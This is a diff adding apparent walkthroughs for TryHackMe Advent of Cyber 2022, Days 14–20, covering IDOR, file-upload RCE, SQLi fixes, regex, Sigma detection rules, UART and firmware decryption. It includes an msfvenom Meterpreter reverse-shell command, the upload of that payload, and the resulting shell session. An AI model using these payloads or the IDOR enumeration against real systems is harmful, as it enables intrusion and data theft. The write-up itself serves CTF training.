@@ -1145,9 +1145,9 @@ In the "statistics" menu :
 ![Conversations](/images/thm/adventofcyber4/adventofcyber4_80.png)
 _Conversations_
 
-Then in theTCP sub-menu :
+Then in the TCP sub-menu :
 
-![RDP](/images/thm/adventofcyber4/adventofcyber4_81.png)
+![RDP](/images/thm/adventofcyber4/adventofcyber4_80b.png)
 _RDP_
 
 Answer : 3389
@@ -1161,7 +1161,7 @@ Answer : RDP
 ### Filter the DNS packets. What are the domain names? Enter the domains in alphabetical order and defanged format. (format: domain[.]zzz,domain[.]zzz)
 Filtering by DNS protocol in the pcap file (open with Wireshark) :
 
-![DNS](/images/thm/adventofcyber4/adventofcyber4_82.png)
+![DNS](/images/thm/adventofcyber4/adventofcyber4_81.png)
 _DNS_
 
 
@@ -1170,7 +1170,7 @@ Answer : bestfestivalcompany[.]thm,cdn[.]bandityeti[.]thm
 ### Filter the HTTP packets. What are the names of the requested files? Enter the names in alphabetical order and in defanged format. (format: file[.]xyz,file[.]xyz)
 Filtering on HTTP protocol :
 
-![http filter](/images/thm/adventofcyber4/adventofcyber4_83.png)
+![http filter](/images/thm/adventofcyber4/adventofcyber4_82.png)
 _http filter_
 
 Answer : favicon[.]ico,mysterygift[.]exe
@@ -1178,7 +1178,7 @@ Answer : favicon[.]ico,mysterygift[.]exe
 ### Which IP address downloaded the executable file? Enter your answer in defanged format.
 We can view the IP address from the HTTP GET request for "mysterygift.exe" :
 
-![http source](/images/thm/adventofcyber4/adventofcyber4_84.png)
+![http source](/images/thm/adventofcyber4/adventofcyber4_83.png)
 _http source_
 
 Answer : 10[.]10[.]29[.]186
@@ -1186,7 +1186,7 @@ Answer : 10[.]10[.]29[.]186
 ### Which domain address hosts the malicious file? Enter your answer in defanged format.
 We can see this information in HTTP section :
 
-![http host](/images/thm/adventofcyber4/adventofcyber4_85.png)
+![http host](/images/thm/adventofcyber4/adventofcyber4_84.png)
 _http host_
 
 Answer : cdn[.]bandityeti[.]thm
@@ -1195,7 +1195,7 @@ Answer : cdn[.]bandityeti[.]thm
 
 This can be found in the same HTTP section but for the other GET request :
 
-![user-agent](/images/thm/adventofcyber4/adventofcyber4_86.png)
+![user-agent](/images/thm/adventofcyber4/adventofcyber4_85.png)
 _user-agent_
 
 Answer : Nim httpclient/1.6.8
@@ -1203,27 +1203,27 @@ Answer : Nim httpclient/1.6.8
 ### Export objects from the PCAP file. Calculate the file hashes. What is the sha256 hash value of the executable file?
 We can export the exe file we captured in the HTTP request via the menu "File" :
 
-![user-agent](/images/thm/adventofcyber4/adventofcyber4_87.png)
+![user-agent](/images/thm/adventofcyber4/adventofcyber4_86.png)
 _user-agent_
 
-![user-agent](/images/thm/adventofcyber4/adventofcyber4_88.png)
+![user-agent](/images/thm/adventofcyber4/adventofcyber4_87.png)
 _user-agent_
 
 Then we can calculate the SHA256 from terminal :
 
-![SHA256](/images/thm/adventofcyber4/adventofcyber4_89.png)
+![SHA256](/images/thm/adventofcyber4/adventofcyber4_88.png)
 _SHA256_
 
 Answer : 0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f
 
 ### Search the hash value of the executable file on VirusTotal. Navigate to the "Behaviour" section. There are multiple IP addresses associated with this file.  What are the connected IP addresses? Enter the IP addressed defanged and in numerical order. (format: IPADDR,IPADDR)
 
-![VirusTotal](/images/thm/adventofcyber4/adventofcyber4_90.png)
+![VirusTotal](/images/thm/adventofcyber4/adventofcyber4_89.png)
 _VirusTotal_
 
 Then we go to the relation tab : 
 
-![VirusTotal relation](/images/thm/adventofcyber4/adventofcyber4_91.png)
+![VirusTotal relation](/images/thm/adventofcyber4/adventofcyber4_90.png)
 _VirusTotal relation_
 
 From those IP addresses, we need to exclude google one (8.8.8.8) and the private IP address (192.168.0.18).
@@ -1235,12 +1235,872 @@ Answer : 20[.]99[.]133[.]109,20[.]99[.]184[.]37,23[.]216[.]147[.]64,23[.]216[.]1
 No Answer.
 
 ## TASK 19 : [Day 14] Web Applications I'm dreaming of secure web apps
+### What is the office number of Elf Pivot McRed? 
+
+First let's connect to the website with the given credentials :
+
+![Web App](/images/thm/adventofcyber4/adventofcyber4_91.png)
+_Web App_
+
+We are logged as McSkidy :
+
+![McSkidy](/images/thm/adventofcyber4/adventofcyber4_92.png)
+_McSkidy_
+
+We can see the number in the URL referring to the Elf McSkidy's page ! Let's see what happened if we increase this number :
+
+![McBlue](/images/thm/adventofcyber4/adventofcyber4_93.png)
+_McBlue_
+
+We get Elf Log McBlue's page ! So move on to find Elf Pivot McRed :
+
+![McRed](/images/thm/adventofcyber4/adventofcyber4_94.png)
+_McRed_
+
+We got his Office Number !
+
+Answer : 134
+
+### Not only profile pages but also stored images are vulnerable. Start with a URL of a valid profile image; what is the hidden flag?
+
+What is the URL for Elf Pivot McRed's image :
+
+![McRed pivot](/images/thm/adventofcyber4/adventofcyber4_95.png)
+_McRed pivot_
+
+Increasing the number in the URL leads to an error after some increase :
+
+![Trial error pivoting](/images/thm/adventofcyber4/adventofcyber4_96.png)
+_Trial error pivoting_
+
+So, let's go backward from Elf Pivot McRed's image. We get it :
+
+![Flag](/images/thm/adventofcyber4/adventofcyber4_97.png)
+_Flag_
+
+Answer : THM{CLOSE_THE_DOOR}
+
+### Do you like IDOR? It's an Advent of Cyber classic! If you want more, check out the dedicated room or the Corridor challenge. 
+No Answer.
+
 ## TASK 20 : [Day 15] Secure Coding Santa is looking for a Sidekick 
+### What is the name given to file uploads that allow threat actors to upload any files that they want?
+
+![Unrestricted](/images/thm/adventofcyber4/adventofcyber4_98.png)
+_Unrestricted_
+
+Answer : Unrestricted
+
+### What is the title of the web application developed by Santa's freelancer?
+
+![SantaSideKick2](/images/thm/adventofcyber4/adventofcyber4_99.png)
+_SantaSideKick2_
+
+Answer : SantaSideKick2
+
+### What is the value of the flag stored in the HR Elf's Documents directory?
+
+First, we need to generate a payload to be executed to gain a reverse shell. We can create a simple exe payload as it was tested and not blocked :
+
+```console
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.225.12 LPORT=6666 -f exe -o cv-username.exe
+```
+{: .nolineno }
+
+![payload](/images/thm/adventofcyber4/adventofcyber4_100.png)
+_payload_
+
+We can now upload this file on the website :
+
+![upload](/images/thm/adventofcyber4/adventofcyber4_101.png)
+_upload_
+
+We can set up a listener on port 6666 or a metsploit handler :
+
+![Reverse shell](/images/thm/adventofcyber4/adventofcyber4_102.png)
+_Reverse shell_
+
+After waiting a few minutes, we finally get a reverse meterpreter : 
+
+```console
+meterpreter > shell
+C:\Windows\system32>cd /Users	
+cd /Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users
+
+11/14/2022  05:58 AM    <DIR>          .
+11/14/2022  05:58 AM    <DIR>          ..
+11/23/2022  05:38 AM    <DIR>          Administrator
+11/20/2022  11:48 AM    <DIR>          HR_Elf
+12/12/2018  07:45 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  14,584,619,008 bytes free
+
+C:\Users>cd HR_Elf	
+cd HR_Elf
+
+C:\Users\HR_Elf>cd Documents
+cd Documents
+
+C:\Users\HR_Elf\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\HR_Elf\Documents
+
+11/14/2022  06:33 AM    <DIR>          .
+11/14/2022  06:33 AM    <DIR>          ..
+11/14/2022  06:34 AM                41 flag.txt
+               1 File(s)             41 bytes
+               2 Dir(s)  14,584,619,008 bytes free
+
+C:\Users\HR_Elf\Documents>type flag.txt
+type flag.txt
+THM{Naughty.File.Uploads.Can.Get.You.RCE}
+```
+{: .nolineno }
+
+Answer : THM{Naughty.File.Uploads.Can.Get.You.RCE}
+
+### What defence technique can be implemented to ensure that specific file types can be uploaded?
+
+![File Extension Validation](/images/thm/adventofcyber4/adventofcyber4_103.png)
+_File Extension Validation_
+
+Answer : File Extension Validation
+
+### What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?
+
+![File Renaming](/images/thm/adventofcyber4/adventofcyber4_104.png)
+_File Renaming_
+
+Answer : File Renaming
+
+### What defence technique can be used to make sure malicious files that can hurt elves are not uploaded?
+
+![Malware scanning](/images/thm/adventofcyber4/adventofcyber4_105.png)
+_Malware scanning_
+
+Answer : Malware scanning
+
+### If you want to learn more about vulnerabilities like this one, check out our Intro to Web Hacking module!
+
+No Answer.
+
 ## TASK 21 : [Day 16] Secure Coding SQLi’s the king, the carolers sing
+### What is the value of Flag1?
+If we follow the Elves instructions, we find vulnerability on the id parameter in elf.php file that we can fix : 
+
+![elf.php](/images/thm/adventofcyber4/adventofcyber4_106.png)
+_elf.php_
+
+![elf.php validation](/images/thm/adventofcyber4/adventofcyber4_107.png)
+_elf.php validation_
+
+Answer : THM{McCode, Elf McCode}
+
+### What is the value of Flag2?
+We can fix the code in "search-toys.php" by preparing the statement before execution in place of injecting directly the given parameter ($_GET('q')) in the query :
+
+![search-toys.php validation](/images/thm/adventofcyber4/adventofcyber4_108.png)
+_search-toys.php validation_
+
+Answer : THM{KodeNRoll}
+
+### What is the value of Flag3?
+
+Elf McRed also found vulnerabilities in "toys.php". We can help him securing this code by securing the 3 $_GET['id'] in the file :
+
+![toy.php validation](/images/thm/adventofcyber4/adventofcyber4_109.png)
+_toy.php validation_
+
+Answer : THM{Are we secure yet?}
+
+### What is the value of Flag4?
+
+Finally, elf McRed found a last vulnerability in login.php :
+
+![login.php validation](/images/thm/adventofcyber4/adventofcyber4_110.png)
+_login.php validation_
+
+We can secure the code by preparing the statement on the username and password POST parameters :
+
+![login.php Flag](/images/thm/adventofcyber4/adventofcyber4_111.png)
+_login.php Flag_
+
+Answer : THM{SQLi_who???}
+
+### If you'd like more SQLi in your life, check out this room! 
+
+No Answer.
+
 ## TASK 22: [Day 17] Secure Coding Filtering for Order Amidst Chaos 
+### Filtering for Usernames: How many usernames fit the syntax above? 
+We search all alphanumeric (low/upper case) usernames with numbers :
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^[a-zA-Z0-9]{6,12}$' strings 
+9z8yMc9T
+31337aq
+39C3qxP
+R6fUTY2nC8
+9Qe5f4
+User35
+u3Y73h3
+5Xze553j
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^[a-zA-Z0-9]{6,12}$' strings  | wc
+      8       8      67
+```
+{: .nolineno }
+
+Answer : 8
+
+### Filtering for Usernames: One username consists of a readable word concatenated with a number. What is it?
+
+We can craft the following regEx to match any alphanumeric character set that start a word follows by a numerical set :
+
+```console
+^[a-zA-Z]+[0-9]+$
+```
+{: .nolineno }
+
+![User35](/images/thm/adventofcyber4/adventofcyber4_112.png)
+_User35_
+
+As for username, we have a condition that the length must be between 6 and 12, user35 is our answer.
+
+Answer : user35
+
+### Filtering for Emails: How many emails fit the syntax above?
+The following regEx can be crafted : 
+
+```console
+^[a-zA-Z0-9.\-]+\@[a-zA-Z0-9]+\.com$
+```
+{: .nolineno }
+
+It says that the first part of the email must contains alphanumeric characters (including . and -) then following by @ then again alphanumeric character set and ending by ".com"
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep ^[a-zA-Z0-9.\-]+\@[a-zA-Z0-9]+\.com$ strings 
+br33zy@gmail.com
+lewisham44@amg.com
+johnny.the.sinner@yahoo.com
+badyeti@gmail.com
+maxximax@fedfull.com
+jklabada@tryhackme.com
+johnny.the.sinner@yahoo.com
+hunter4k@canary.com
+hussain.volt@hotmail.com
+marckymarc@tryhackme.com
+batteryvoltas@alfa.com
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep ^[a-zA-Z0-9.\-]+\@[a-zA-Z0-9]+\.com$ strings | wc
+     11      11     247
+```
+{: .nolineno }
+
+Answer : 11
+
+### Filtering for Emails: How many unique domains are there?
+
+Based on previous RegEx : 
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '\@[a-zA-Z0-9]+\.com$' strings  | sort | cut -d '@' -f2
+gmail.com
+alfa.com
+gmail.com
+canary.com
+hotmail.com
+tryhackme.com
+yahoo.com
+yahoo.com
+amg.com
+tryhackme.com
+fedfull.com
+```
+{: .nolineno }
+
+We have 11 match but 3 double domains : gmail.com, yahoo.com and tryhackme.com.
+
+Answer : 8
+
+### Filtering for Emails: What is the domain of the email with the local-part "lewisham44"?
+
+Based on first email RegEx filter, we can force the string to begin with lewisham44 : 
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^(lewisham44)\@[a-zA-Z0-9]+\.com$' strings        
+lewisham44@amg.com
+```
+{: .nolineno }
+
+Answer : amg.com
+
+### Filtering for Emails: What is the domain of the email with the local-part "maxximax"?
+Same as previous question :
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^(maxximax)\@[a-zA-Z0-9]+\.com$' strings 
+maxximax@fedfull.com
+ubuntu@tryhackme:~/
+```
+{: .nolineno }
+
+Answer : fedfull.com
+
+### Filtering for Emails: What is the local-part of the email with the domain name "hotmail.com"?
+We can force the domain in place of the local-part of the email : 
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '\@(hotmail.com)$' strings 
+hussain.volt@hotmail.com
+```
+{: .nolineno }
+
+Answer : hussain.volt
+
+### Filtering for URLs: How many URLs fit the syntax provided?
+
+To do this RegEx, we need to :
+
+- start either by 
+```console
+"http://" or "https://"  =>  (^(https\:\/\/)|^(http\:\/\/))
+```
+{: .nolineno }
+- following by optionnal "www" => w?w?w?
+- following by random strings => [a-zA-Z0-9]+
+- following by a dot : \.
+- following by random strings => [a-zA-Z0-9]+
+- following by a dot : \.
+- following by random strings => [a-zA-Z0-9]+
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '(^(https\:\/\/)|^(http\:\/\/))(w?w?w?)[a-zA-Z0-9]+\.[a-zA-Z0-9]+\.?[a-zA-Z0-9]+' strings 
+http://www.sample.net/blood?ghost=force
+http://keebler.com/dicta-tempore-id-dolores-blanditiis-ut.html
+http://koch.com/quae-perspiciatis-non-unde-quo
+http://johns.net/nisi-quis-dolorum-et-rerum
+https://www.sample.edu/#fire
+http://www.sample.info/?mint=trouble&action=move
+https://www.sample.org/?quiet=expansion&grip=eggnog
+http://spencer.com/sapiente-tempore-omnis-a-est-aut-atque-pariatur
+http://pfeffer.biz/nulla-non-facilis-incidunt-necessitatibus-velit-inventore
+https://www.kertzmann.com/possimus-ullam-consequatur-itaque-sed-modi-aliquam
+https://www.sample.com/?air=color&cave=judge#shake
+http://schinner.com/quia-vitae-qui-explicabo-provident-minima-ratione.html
+https://runolfsson.com/esse-ab-rerum-et-quis-aut.html
+https://www.moen.com/explicabo-exercitationem-culpa-et-eum-temporibus
+https://horse.sample.com/shape/company?mom=collar#donkey
+http://batz.com/reprehenderit-voluptate-id-soluta-tenetur
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '(^(https\:\/\/)|^(http\:\/\/))(w?w?w?)[a-zA-Z0-9]+\.[a-zA-Z0-9]+\.?[a-zA-Z0-9]+' strings | wc
+     16      16     910
+```
+{: .nolineno }
+
+Answer : 16
+
+### Filtering for URLs: How many of these URLs start with "https"?
+
+We can force the string to begin (with anchor ^) with the exact string https:// and escaping ":" and "/" with "\" :
+
+```console
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^(https\:\/\/)' strings 
+https://www.sample.edu/#fire
+https://www.sample.org/?quiet=expansion&grip=eggnog
+https://www.kertzmann.com/possimus-ullam-consequatur-itaque-sed-modi-aliquam
+https://www.sample.com/?air=color&cave=judge#shake
+https://runolfsson.com/esse-ab-rerum-et-quis-aut.html
+https://www.moen.com/explicabo-exercitationem-culpa-et-eum-temporibus
+https://horse.sample.com/shape/company?mom=collar#donkey
+ubuntu@tryhackme:~/Desktop/RegExPractice$ egrep '^(https\:\/\/)' strings | wc
+      7       7     390
+```
+{: .nolineno }
+
+Answer :  7
+
+### If you feel like you could use more fundamental skills in your life, try the Linux Fundamentals module. All rooms are free in that one! 
+No Answer.
+
 ## TASK 23: [Day 18] Sigma Lumberjack Lenny Learns New Rules 
+### What is the Challenge #1 flag?
+We have information about the investigation to do :
+
+![Attack Technique](/images/thm/adventofcyber4/adventofcyber4_113.png)
+_Attack Technique_
+
+With this table provided and following the Sigma syntax, we can write this first rule :
+
+```console
+Title: Challenge1
+id: 000001 # UUID
+status: # experimental, test, stable, deprecated, unsupported.
+description: THM room
+author: CYB3RM3
+date: 2022-12-23
+modified: 2022-12-23
+
+logsource: # Outlines target source of the logs based on operating system, service being run, category of logs.
+ product: Windows # windows, linux, macos.
+ service: security # sshd for Linux, Security for Windows, applocker, sysmon.
+ category:  # firewall, web, antivirus, process_creation, network_connection, file_access.
+detection:
+ selection:
+ EventID: 
+ - 4720 # Change me
+ condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.
+
+falsepositives: # Legitimate services or use.
+ - unknown
+
+level: high # informational, low, medium, high or critical.
+
+tags: # Associated TTPs from MITRE ATT&CK
+ - {attack.persistence} # MITRE Tactic
+ - {attack.T1136} # MITRE Technique
+```
+{: .nolineno }
+
+![AOC Sigma](/images/thm/adventofcyber4/adventofcyber4_114.png)
+_AOC Sigma_
+
+Answer : THM{n0t_just_your_u$ser}
+
+### From the Challenge 1 log, what user account was created?
+From the log :
+
+![BanditYetiMini](/images/thm/adventofcyber4/adventofcyber4_115.png)
+_BanditYetiMini_
+
+Answer : BanditYetiMini
+
+### What is the Challenge #2 flag?
+After getting a too specific rule for putting the entire regitry key in the Sigma rule, i got the following rule :
+
+```console
+title: Challenge2
+id: 000002 # UUID
+status: # experimental, test, stable, deprecated, unsupported.
+description: THM room
+author: CYB3RM3
+date: 2022-12-23
+modified: 2022-12-23
+
+logsource: # Outlines target source of the logs based on operating system, service being run, category of logs.
+  product: Windows # windows, linux, macos.
+  service: sysmon  # sshd for Linux, Security for Windows, applocker, sysmon.
+  category: process_creation # firewall, web, antivirus, process_creation, network_connection, file_access.
+detection:
+  selection:
+    EventID: 
+     - 1 # Change me
+    Image:
+     - 'C:\Windows\System32\reg.exe'
+    CommandLine|contains:
+     - '/v svcVersion'
+  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.
+
+falsepositives: # Legitimate services or use.
+  - unknown
+
+level: high # informational, low, medium, high or critical.
+
+tags: # Associated TTPs from MITRE ATT&CK
+  - {attack.discovery} # MITRE Tactic
+  - {attack.T1518.001} # MITRE Technique 
+```
+{: .nolineno }
+
+![AOC Sigma](/images/thm/adventofcyber4/adventofcyber4_116.png)
+_AOC Sigma_
+
+Answer : THM{wh@t_1s_Runn1ng_H3r3}
+
+### What was the User's path in the Challenge #2 log file?
+After opening the log :
+
+![SIGMA_AOC2022\Bandit Yeti](/images/thm/adventofcyber4/adventofcyber4_117.png)
+_SIGMA_AOC2022\Bandit Yeti_
+
+Answer : SIGMA_AOC2022\Bandit Yeti
+
+### What is the Challenge #3 flag?
+
+We can craft the 3rd rule as below :
+
+```console
+title: Challenge3
+id: 000003 # UUID
+status: # experimental, test, stable, deprecated, unsupported.
+description: THM room
+author: CYB3RM3
+date: 2022-12-23
+modified: 2022-12-23
+
+logsource: # Outlines target source of the logs based on operating system, service being run, category of logs.
+  product: Windows # windows, linux, macos.
+  service: sysmon  # sshd for Linux, Security for Windows, applocker, sysmon.
+  category: process_creation # firewall, web, antivirus, process_creation, network_connection, file_access.
+detection:
+  selection:
+    EventID: 
+     - 1 # Change me
+    Image|contains:
+     - 'C:\Windows\System32\schtasks.exe'
+    CommandLine|contains|all:
+     - 'schtasks'
+     - '/create'
+
+  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.
+
+falsepositives: # Legitimate services or use.
+  - unknown
+
+level: high # informational, low, medium, high or critical.
+
+tags: # Associated TTPs from MITRE ATT&CK
+  - {attack.Execution}
+  - {attack.Persistence}
+  - {attack.PrivilegeEscalation} # MITRE Tactic
+```
+{: .nolineno }
+
+![AOC Sigma](/images/thm/adventofcyber4/adventofcyber4_118.png)
+_AOC Sigma_
+
+Answer : THM{sch3dule_0npo1nt_101}
+
+### What was the MD5 hash associated with Challenge #3 logs?
+In the log :
+
+![AOC Sigma](/images/thm/adventofcyber4/adventofcyber4_119.png)
+_AOC Sigma_
+
+Answer : 2F6CE97FAF2D5EEA919E4393BDD416A7
+
+### Did you like learning about detection? Check out the Yara room to learn more!
+No Answer.
+
 ## TASK 24: [Day 19] Hardware Hacking Wiggles go brrr 
+### What device can be used to probe the signals being sent on electrical wires between two devices? 
+
+![Logic Analyser](/images/thm/adventofcyber4/adventofcyber4_120.png)
+_Logic Analyser_
+
+Answer : Logic Analyser
+
+### USART is faster than SPI for communication? (Yea,Nay)
+
+![USART](/images/thm/adventofcyber4/adventofcyber4_121.png)
+_USART_
+
+Answer : NAY
+
+### USART communication uses fewer wires than SPI? (Yea,Nay)
+
+Answer : YEA
+
+### USART is faster than I2C for communication? (Yea,Nay)
+
+Answer : NAY
+
+### I2C uses more wires than SPI for communication? (Yea,Nay)
+
+![I2C](/images/thm/adventofcyber4/adventofcyber4_122.png)
+_I2C_
+
+Answer : NAY
+
+### SPI is faster than I2C for communication? (Yea,Nay)
+
+![SPI](/images/thm/adventofcyber4/adventofcyber4_123.png)
+_SPI_
+
+Answer : YEA
+
+### What is the maximum number of devices that can be connected on a single pair of I2C lines?
+
+![I2C lines](/images/thm/adventofcyber4/adventofcyber4_124.png)
+_I2C lines_
+
+Answer : 1008
+
+### What is the new baud rate that is negotiated between the microprocessor and ESP32 chip?
+
+![new baud rate](/images/thm/adventofcyber4/adventofcyber4_125.png)
+_new baud rate_
+
+Answer : 9600
+
+### What is the flag that is transmitted once the new baud rate was accepted?
+
+Following the suggested steps, we can view the baud rate negociation. When we got the new value (9600), we can modify the configuration to see the rest of the communication :
+
+![baud rate negociation](/images/thm/adventofcyber4/adventofcyber4_126.png)
+_baud rate negociation_
+
+![baud rate negociation](/images/thm/adventofcyber4/adventofcyber4_127.png)
+_baud rate negociation_
+
+![baud rate negociation](/images/thm/adventofcyber4/adventofcyber4_128.png)
+_baud rate negociation_
+
+Answer : THM{Hacking.Hardware.Is.Fun}
+
+### Looking for a challenge? Try our Recent Threats module!
+No Answer.
+
 ## TASK 25: [Day 20] Firmware Binwalkin’ around the Christmas tree 
+### What is the flag value after reversing the file firmwarev2.2-encrypted.gpg? Note: The flag contains underscores - if you're seeing spaces, the underscores might not be rendering.
+Firstly, when we try to reversing the firmwarev2.2, we got nothing because, it is encrypted :
+
+```console
+test@ip-10-10-207-155:~$ ls
+bin  bin-unsigned  firmware-mod-kit
+test@ip-10-10-207-155:~$ cd bin
+test@ip-10-10-207-155:~/bin$ ls
+firmwarev2.2-encrypted.gpg
+test@ip-10-10-207-155:~/bin$ binwalk -E -N firmwarev2.2-encrypted.gpg 
+
+DECIMAL       HEXADECIMAL     ENTROPY
+--------------------------------------------------------------------------------
+0             0x0             Rising entropy edge (0.989903)
+
+test@ip-10-10-207-155:~/bin$
+```
+{: .nolineno }
+
+So as we have a previous version of the firmware, not encrypted, we can try to find our keys in it :
+
+```console
+Test@ip-10-10-207-155:~/bin$ cd ../bin-unsigned/
+test@ip-10-10-207-155:~/bin-unsigned$ ls
+firmwarev1.0-unsigned
+test@ip-10-10-207-155:~/bin-unsigned$ binwalk -E -N firmwarev1.0-unsigned 
+
+DECIMAL       HEXADECIMAL     ENTROPY
+--------------------------------------------------------------------------------
+0             0x0             Falling entropy edge (0.428457)
+14336         0x3800          Rising entropy edge (0.956537)
+49152         0xC000          Falling entropy edge (0.837210)
+133120        0x20800         Rising entropy edge (0.987979)
+980992        0xEF800         Falling entropy edge (0.148437)
+1181696       0x120800        Rising entropy edge (0.988612)
+3991552       0x3CE800        Falling entropy edge (0.399034)
+
+test@ip-10-10-207-155:~/bin-unsigned$ 
+```
+{: .nolineno }
+
+Seems we can reverse this one ! We can use the given password for the machine (Santa1010) when prompted :
+
+```console
+test@ip-10-10-207-155:~/bin-unsigned$ ls
+firmwarev1.0-unsigned
+test@ip-10-10-207-155:~/bin-unsigned$ extract-firmware.sh firmwarev1.0-unsigned 
+Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
+
+Scanning firmware...
+
+Scan Time:     2022-12-24 09:09:51
+Target File:   /home/test/bin-unsigned/firmwarev1.0-unsigned
+MD5 Checksum:  b141dc2678be3a20d4214b93354fedc0
+Signatures:    344
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x
+0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kerne
+l length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
+13392         0x3450          CRC32 polynomial table, big endian
+14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: 2016-04-06 03:12:
+24, image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: 
+MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
+14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed si
+ze: 93944 bytes
+131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, pr
+oduct version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel len
+gth: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed si
+ze: 2494744 bytes
+1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2812026 bytes, 
+600 inodes, blocksize: 131072 bytes, created: 2022-11-17 11:14:32
+
+Extracting 1180160 bytes of tp-link header image at offset 0
+Extracting squashfs file system at offset 1180160
+3994112
+3994112
+0
+Extracting squashfs files...
+[sudo] password for test: Santa1010
+Firmware extraction successful!
+Firmware parts can be found in '/home/test/bin-unsigned/fmk/*'
+test@ip-10-10-207-155:~/bin-unsigned$
+```
+{: .nolineno }
+
+We can now search for keys in the extracted files :
+
+```console
+test@ip-10-10-207-155:~/bin-unsigned$ grep -ir key
+Binary file firmwarev1.0-unsigned matches
+Binary file fmk/image_parts/rootfs.img matches
+Binary file fmk/rootfs/usr/sbin/dropbearmulti matches
+Binary file fmk/rootfs/usr/sbin/dhcp6ctl matches
+Binary file fmk/rootfs/usr/sbin/dhcp6c matches
+Binary file fmk/rootfs/usr/sbin/xl2tpd matches
+Binary file fmk/rootfs/usr/sbin/pppd matches
+Binary file fmk/rootfs/usr/sbin/dhcp6s matches
+Binary file fmk/rootfs/usr/bin/httpd matches
+[...]
+fmk/rootfs/gpg/public.key:-----BEGIN PGP PUBLIC KEY BLOCK-----
+fmk/rootfs/gpg/public.key:-----END PGP PUBLIC KEY BLOCK-----
+fmk/rootfs/gpg/private.key:-----BEGIN PGP PRIVATE KEY BLOCK-----
+fmk/rootfs/gpg/private.key:-----END PGP PRIVATE KEY BLOCK-----
+test@ip-10-10-207-155:~/bin-unsigned$
+```
+{: .nolineno }
+
+We find PGP keys. Usually, there is also a passphrase associated with the private key, let's search for it:
+
+```console
+test@ip-10-10-207-155:~/bin-unsigned$ grep -ir paraphrase
+fmk/rootfs/gpg/secret.txt:PARAPHRASE: Santa@2022
+test@ip-10-10-207-155:~/bin-unsigned$ 
+```
+{: .nolineno }
+
+We can now import our found keys and entering the passphrase when asked :
+
+```console
+ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/private.key 
+```
+{: .nolineno }
+
+![gpg](/images/thm/adventofcyber4/adventofcyber4_129.png)
+_gpg_
+
+```console
+test@ip-10-10-207-155:~/bin-unsigned$ gpg --import fmk/rootfs/gpg/public.key 
+gpg: key 56013838A8C14EC1: "McSkidy <mcskidy@santagift.shop>" not changed
+gpg: Total number processed: 1
+gpg:              unchanged: 1
+```
+{: .nolineno }
+
+We can list the imported new keys :
+
+```console
+test@ip-10-10-207-155:~/bin-unsigned$ gpg --list-secret-keys 
+/home/test/.gnupg/pubring.kbx
+-----------------------------
+sec   rsa3072 2022-11-17 [SC] [expires: 2024-11-16]
+      514B4994E9B3E47A4F89507A56013838A8C14EC1
+uid           [ unknown] McSkidy <mcskidy@santagift.shop>
+ssb   rsa3072 2022-11-17 [E] [expires: 2024-11-16]
+```
+{: .nolineno }
+
+With can now decrypt the firmwareV2.2 : 
+
+```console
+test@ip-10-10-207-155:~/bin-unsigned$ gpg firmwarev2.2-encrypted.gpg 
+```
+{: .nolineno }
+
+![Decrypt](/images/thm/adventofcyber4/adventofcyber4_130.png)
+_Decrypt_
+
+When it's done, we can extract the files :
+
+```console
+test@ip-10-10-207-155:~/bin$ ls
+firmwarev2.2-encrypted  firmwarev2.2-encrypted.gpg
+test@ip-10-10-207-155:~/bin$ extract-firmware.sh firmwarev2.2-encrypted
+Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
+
+Scanning firmware...
+
+Scan Time:     2022-12-24 09:19:24
+Target File:   /home/test/bin/firmwarev2.2-encrypted
+MD5 Checksum:  714c30af5db1e156e35b374f87c59d6f
+Signatures:    344
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x
